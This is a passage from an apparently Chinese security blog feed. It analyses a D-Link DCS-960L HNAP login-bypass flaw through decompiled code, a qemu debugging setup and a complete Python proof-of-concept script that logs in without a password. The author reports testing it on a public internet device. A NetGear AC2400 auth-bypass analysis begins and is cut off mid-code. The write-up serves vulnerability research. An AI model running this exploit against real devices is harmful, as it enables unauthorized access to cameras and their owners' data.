class="built_in">sprintf</span>(key, <span class="string">&quot;%s%s&quot;</span>, maybe_public_key, password);<span class="comment">// public_key + password</span></span><br><span class="line">        temp = &amp;maybe_public_key[<span class="number">4</span>] + <span class="number">4</span>;        <span class="comment">// challenge</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My challenge: %s\n&quot;</span>, &amp;maybe_public_key[<span class="number">4</span>] + <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My public_key: %s\n&quot;</span>, public_key);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My password: %s\n&quot;</span>, password);</span><br><span class="line">        text_len = <span class="built_in">strlen</span>(temp);                <span class="comment">// 获取 challenge 的长度</span></span><br><span class="line">        key_len = <span class="built_in">strlen</span>(key);                  <span class="comment">// 获取 public_key + password 的长度</span></span><br><span class="line">        hmac_md5(temp, text_len, key, key_len, &amp;digest);<span class="comment">// hmac_md5(challenge, challenge_len, public_key + password, key_len, digest)</span></span><br><span class="line">        <span class="built_in">sprintf</span>(private_key, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, digest, v49, v50, v51);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My private_key: %s\n&quot;</span>, private_key);</span><br><span class="line">        digest = <span class="number">0</span>;</span><br><span class="line">        v49 = <span class="number">0</span>;</span><br><span class="line">        v50 = <span class="number">0</span>;</span><br><span class="line">        v51 = <span class="number">0</span>;</span><br><span class="line">        public_key = <span class="built_in">strlen</span>(temp);              <span class="comment">// 获取 challenge 长度</span></span><br><span class="line">        v20 = <span class="built_in">strlen</span>(private_key);              <span class="comment">// 获取 private_key 长度</span></span><br><span class="line">        hmac_md5(temp, public_key, private_key, v20, &amp;digest);<span class="comment">// hmac_md5(challenge, challenge_len, private_key, private_key_len, digest)</span></span><br><span class="line">        <span class="built_in">sprintf</span>(v52, <span class="string">&quot;%08X%08X%08X%08X&quot;</span>, digest, v49, v50, v51);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;My login_password: %s\n&quot;</span>, v52);</span><br><span class="line">        v21 = <span class="built_in">strcmp</span>(login_password3, v52) == <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Check authStatus: %d\n&quot;</span>, v21);</span><br><span class="line">        v22 = v2;</span><br><span class="line">        <span class="keyword">if</span> ( v21 )</span><br><span class="line">        &#123;</span><br><span class="line">          v23 = time(<span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( HIBYTE(maybe_public_key[<span class="number">1509</span>])</span><br><span class="line">            &amp;&amp; BYTE4(maybe_public_key[<span class="number">1513</span>])</span><br><span class="line">            &amp;&amp; v23 - LODWORD(maybe_public_key[<span class="number">1515</span>]) &lt; <span class="number">301</span></span><br><span class="line">            &amp;&amp; (v24 = &amp;maybe_public_key[<span class="number">1524</span>], v23 &gt;= SLODWORD(maybe_public_key[<span class="number">1515</span>])) )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = *(v24 + <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">if</span> ( !HIBYTE(maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1509</span>]) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !BYTE4(maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1513</span>]) )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v27 = v23 - v26 &gt;= <span class="number">301</span>;</span><br><span class="line">              v28 = v23 &lt; v26;</span><br><span class="line">              <span class="keyword">if</span> ( v27 )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              ++v25;</span><br><span class="line">              <span class="keyword">if</span> ( v28 )</span><br><span class="line">              &#123;</span><br><span class="line">                --v25;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              v24 += <span class="number">9</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v25 == <span class="number">1000</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                ixmlAppendNewElement(v2, v3, <span class="string">&quot;LoginResult&quot;</span>, <span class="string">&quot;failed&quot;</span>);</span><br><span class="line">                v15 = v2;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v25 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1509</span>], <span class="number">0x23</span>u, <span class="string">&quot;%s&quot;</span>, private_key);</span><br><span class="line">          <span class="built_in">snprintf</span>(&amp;maybe_public_key[<span class="number">9</span> * v25 + <span class="number">1513</span>] + <span class="number">4</span>, <span class="number">0xB</span>u, <span class="string">&quot;%s&quot;</span>, v41);</span><br><span class="line">          v29 = &amp;username2[<span class="number">18</span> * v25];</span><br><span class="line">          *(v29 + <span class="number">1566</span>) = v23;</span><br><span class="line">          *(v29 + <span class="number">12544</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(username2, <span class="string">&quot;admin&quot;</span>) )</span><br><span class="line">            BYTE1(v36[<span class="number">9</span> * v25 + <span class="number">1572</span>]) = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            BYTE1(v36[<span class="number">9</span> * v25 + <span class="number">1572</span>]) = <span class="number">0</span>;</span><br><span class="line">          SIWriteBin(<span class="number">63</span>, maybe_public_key, <span class="number">84072</span>);</span><br><span class="line">          ixmlAppendNewElement(v2, v3, <span class="string">&quot;LoginResult&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">          v15 = v2;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>首先获取用户传入的用户名和密码，接着初始化了一些变量，然后调用 usrInit、usrGetPass、usrFree 三个函数，其中 usrGetPass 函数代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">usrGetPass</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *username, <span class="type">char</span> *buffer, <span class="type">size_t</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v7; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [sp+18h] [-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !*username )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  v7 = &amp;maybe_username_list;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = *v7;</span><br><span class="line">    v7 += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      n = a3;</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(v8, username);</span><br><span class="line">      a3 = n;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++index;</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( index == <span class="number">21</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(buffer, *(&amp;maybe_password_list + <span class="number">3</span> * index + <span class="number">2</span>), n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>分别传入 username 和一个 buffer，该函数会在用户名列表中尝试匹配给定的用户名，当找到对应的用户，再把它的密码拷贝到 buffer 中。</p>
<p>获取到用户的密码之后，进入密码验证环节。用户可以通过一个特定的请求从服务端获取 3 个参数，分别是 cookie、challenge 和 public key。获取到这三个参数后，用户需要在本地执行以下运算</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 拼接 public key 和 password，得到 key1</span><br><span class="line">2. 用 challenge 和 key1 执行运算 hmac_md5(challenge, challenge_len, key, key_len)，即用 key1 加密(实际上是哈希) challenge，得到 private key</span><br><span class="line">3. 用 private key 和 challenge 执行运算 hmac_md5(challenge, challenge_len, private_key, private_key_len)，即用 private key 加密(实际上是哈希) challenge，得到密文 login_password</span><br></pre></td></tr></table></figure></div>

<p>得到 login_password 将它和用户名封装在一个请求中，发送到服务端，服务端执行相同的计算(服务端拥有正确的 password)，得到正确的 login_password，然后用 strcmp 和用户传入的 login_password 比较，如果相同则登录成功，服务端将本次请求的 cookie 写入内存，视为登录凭据。</p>
<p>通过上述算法可以发现，如果用户拥有合法的 password，就能得到正确的 login_pasword，因为 challenge、public key 可通过请求服务端得到。如果想要攻击的话只能通过爆破 password 尝试登录。</p>
<p>但是服务端在处理 password 时存在一个问题，我们之前提到它首先通过 usrGetPass 函数来获取传入的用户名对应的密码，仔细观察此函数的实现，用户名列表长度是有限的(21)，如果外部传递一个在用户名列表中不存在值，使 index 递增到 21，此函数会返回 -1，并且不会向 buffer 拷贝内容，另外 Login 函数调用 usrGetPass 也没有检查返回值。</p>
<p>当一个攻击者向服务端提供某不存在的用户名，usrGetPass 返回 -1，并且本来应该存放 password 的 buffer 此时为空(全部为 \x00)，那么攻击者只需要得到 challenge 和 public key，然后按照上述算法执行计算即可得到 login password。</p>
<p><strong>调试验证</strong></p>
<p>Login 函数的反编译结果存在一些小问题，静态分析可能没法写出可用的 POC，我们可以尝试进行动态调试。</p>
<p>hnap_service 是一个 cgi 程序，不涉及监听端口等复杂操作，可以直接用 qemu 模拟执行，启动命令如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-mips-static -g 12345 -E REQUEST_METHOD=POST,SOAP_ACTION=http://purenetworks.com/HNAP1/Login,CONTENT_LENGTH=432,COOKIE=aaaaaaaaaa -L . ./web/cgi-bin/hnap/hnap_service</span><br></pre></td></tr></table></figure></div>

<p>-g 表示等待 gdb 附加，-E 指定几个必要的环境变量。运行之后可以用 IDA 附加，在调试的时候要注意某些函数可能会导致程序崩溃，例如 usrGetPass，IReadBin 等，原因是这些函数访问了某共享内存，这块内存正常应该保存着一些用户信息、challenge、public key 等数据，但由于我们是单文件模拟，所以它们没法正常执行，遇到这类函数要手动跳过。</p>
<p>指向上述命令，IDA 附加之后，在 main 函数开头下断点并执行到这里，然后回到终端输入以下内容</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;catalpa&lt;/Username&gt;&lt;LoginPassword&gt;CC42B96E000000000000000000000000&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>

<p>正常执行，直到进入 Login 函数，在这里就可以开始调试分析了，如上所述，某些会导致程序崩溃的函数手动跳过，challenge、public key 等数据通过修改内存的方式手动写入，当执行完第二次 hmac_md5 之后就可以在内存中看到正确的 password，以某公网设备的数据为例</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-3.png"
                     
                ></p>
<p>按照上述思路编写 POC 如下</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://xx.xx.xx.xx/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_info</span>():</span><br><span class="line">    burp0_url = URL + <span class="string">&quot;HNAP1/&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;SOAPAction&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/Login\&quot;&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:&quot;</span> +  \</span><br><span class="line">                 <span class="string">&quot;soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=\&quot;http://purenetworks.com/HNAP1/\&quot;&gt;&lt;Action&gt;request&lt;/Action&gt;&lt;Username&gt;CataLpa&lt;/Username&gt;&quot;</span>       +  \</span><br><span class="line">                 <span class="string">&quot;&lt;LoginPassword&gt;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line">    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    challenge = res.content[<span class="number">312</span>:<span class="number">332</span>]</span><br><span class="line">    cookie = res.content[<span class="number">352</span>:<span class="number">362</span>]</span><br><span class="line">    public_key = res.content[<span class="number">382</span>:<span class="number">402</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] challenge: &quot;</span> + challenge)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] cookie: &quot;</span> + cookie)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] public key: &quot;</span> + public_key)</span><br><span class="line">    <span class="keyword">return</span> challenge, cookie, public_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_password</span>(<span class="params">challenge, public_key</span>):</span><br><span class="line">    enc1 = hmac.new(public_key, challenge).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] private key: &quot;</span> + enc1.upper())</span><br><span class="line">    enc2 = hmac.new(enc1.upper(), challenge).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] password: &quot;</span> + enc2.upper())</span><br><span class="line">    <span class="keyword">return</span> enc2.upper()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">cookie, password</span>):</span><br><span class="line">    burp0_url = URL + <span class="string">&quot;HNAP1/&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;SOAPAction&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/Login\&quot;&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;uid=&quot;</span> + cookie + <span class="string">&quot;;&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, </span><br><span class="line">                     <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:&quot;</span> +  \</span><br><span class="line">                 <span class="string">&quot;soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=\&quot;http://purenetworks.com/HNAP1/\&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;CataLpa&lt;/Username&gt;&quot;</span>       +  \</span><br><span class="line">                 <span class="string">&quot;&lt;LoginPassword&gt;&quot;</span> + password + <span class="string">&quot;&lt;/LoginPassword&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line">    res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">challenge, cookie, public_key =  get_info()</span><br><span class="line">password = get_password(challenge, public_key)</span><br><span class="line">login(cookie, password)</span><br></pre></td></tr></table></figure></div>

<p>用某公网设备测试得到结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/DCS-960L-4.png"
                     
                ></p>
<p>成功利用了此漏洞绕过登录逻辑。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>NetGear AC2400 漏洞复现</title>
    <url>/2021/01/13/AC2400_vuln/</url>
    <content><![CDATA[<p>身份验证绕过以及命令注入</p>
<span id="more"></span>

<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p>官方发布信息：<a class="link"   href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers" >https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>披露信息：<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1451/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1451/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
<p>漏洞评分：8.8(<strong>High</strong>)</p>
<p>漏洞描述：NetGear 部分路由器存在登录验证绕过漏洞，攻击者可以利用此漏洞绕过正常的登录逻辑直接访问后台接口，可以结合其他漏洞实现任意代码执行。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据披露信息，去网件官网下载到存在漏洞的固件：<a class="link"   href="https://www.netgear.com/support/" >https://www.netgear.com/support/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>ZDI 披露信息指出漏洞影响多个型号的设备，我们以 AC2400 为例分析。</p>
<p>下载 1.2.0.74 和 1.2.0.76 两个版本固件，分析公开漏洞一个比较实用的方法就是进行版本比较，常用工具包括 Ghidra、Bindiff、diaphora 等。(PS：IDA 7.5 支持 MIPS 反编译啦，可以使用 Bindiff 6)</p>
<p>首先对固件解包，固件没有经过特殊处理，直接 binwalk 一下即可。解开得到一个 Linux 文件系统，按照披露信息找到 &#x2F;usr&#x2F;sbin&#x2F;mini_httpd 二进制程序，加载到 IDA。</p>
<p>Shift+F12 搜索字符串，漏洞位于处理用户请求的位置，所以直接搜索 Content-Length 或者其他请求头中会出现的字符串，通过交叉引用可以定位到函数 0x40A540 (1.2.0.74)，其中存在以下代码片段</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(v4, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1634</span>);</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;read\n&quot;</span>, v4);</span><br><span class="line">fclose(v4);</span><br></pre></td></tr></table></figure></div>

<p>可以猜测这个函数叫做 handle_request，主要用于处理 HTTP 请求。</p>
<p>摘录两个版本的代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.2.0.74</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">handle_request</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">// 省略变量定义部分</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(maybe_allow_uris, off_427030, <span class="keyword">sizeof</span>(maybe_allow_uris));</span><br><span class="line">  signal(<span class="number">14</span>, sub_407B68);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  dword_42972C = <span class="number">0</span>;</span><br><span class="line">  dword_429730 = <span class="number">0</span>;</span><br><span class="line">  path = <span class="number">0</span>;</span><br><span class="line">  dword_429734 = <span class="number">0</span>;</span><br><span class="line">  dword_42974C = <span class="number">-1</span>;</span><br><span class="line">  dword_429738 = <span class="number">0</span>;</span><br><span class="line">  dword_42973C = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_429744 = <span class="number">0</span>;</span><br><span class="line">  dword_429748 = <span class="number">-1</span>;</span><br><span class="line">  host = <span class="number">0</span>;</span><br><span class="line">  v0 = <span class="number">4390912</span>;</span><br><span class="line">  ::haystack = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_429768 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_42976C = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  dword_429750 = <span class="number">0</span>;</span><br><span class="line">  authorization = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">4390912</span>;</span><br><span class="line">  dword_429758 = <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="number">4390912</span>;</span><br><span class="line">  dword_429760 = <span class="number">-1</span>;</span><br><span class="line">  dword_429740 = <span class="number">0</span>;</span><br><span class="line">  dword_429754 = <span class="number">0</span>;</span><br><span class="line">  dword_42975C = <span class="number">0</span>;</span><br><span class="line">  login_or_not = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    v170 = <span class="number">1</span>;</span><br><span class="line">    setsockopt(fd, <span class="number">6</span>, <span class="number">3</span>, &amp;v170, <span class="number">4u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( do_ssl )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_429770 = SSL_new(dword_428718, v0, v1, v2);</span><br><span class="line">    SSL_set_fd(dword_429770, fd);</span><br><span class="line">    <span class="keyword">if</span> ( !SSL_accept(dword_429770) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_97;</span><br><span class="line">  &#125;</span><br><span class="line">  dword_429774 = <span class="number">0</span>;</span><br><span class="line">  dword_429778 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_406E2C(v178, <span class="number">9999</span>, v1, v2);</span><br><span class="line">      <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">fprintf</span>(v4, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1634</span>);</span><br><span class="line">          <span class="built_in">fputs</span>(<span class="string">&quot;read\n&quot;</span>, v4);</span><br><span class="line">          fclose(v4);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v5 = *_errno_location();</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">4</span> &amp;&amp; v5 != <span class="number">11</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_14:</span><br><span class="line">        v6 = access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        v7 = <span class="number">4259840</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v8 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v8 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(v8, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1639</span>);</span><br><span class="line">            v9 = <span class="string">&quot;break on nothing read\n&quot;</span>;</span><br><span class="line">LABEL_25:</span><br><span class="line">            <span class="built_in">fputs</span>(v9, v8);</span><br><span class="line">            fclose(v8);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    alarm(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">&quot;/tmp/dbg_x&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(v10, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;handle_request&quot;</span>, <span class="number">1643</span>);</span><br><span class="line">        <span class="built_in">fprintf</span>(v10, <span class="string">&quot;read: %s\n&quot;</span>, v178);</span><br><span class="line">        fclose(v10);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_405A40(&amp;dword_42977C, &amp;dword_429774, &amp;dword_429780, v178, v3);</span><br><span class="line">    v11 = dword_42977C;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !<span class="built_in">strstr</span>(dword_42977C, <span 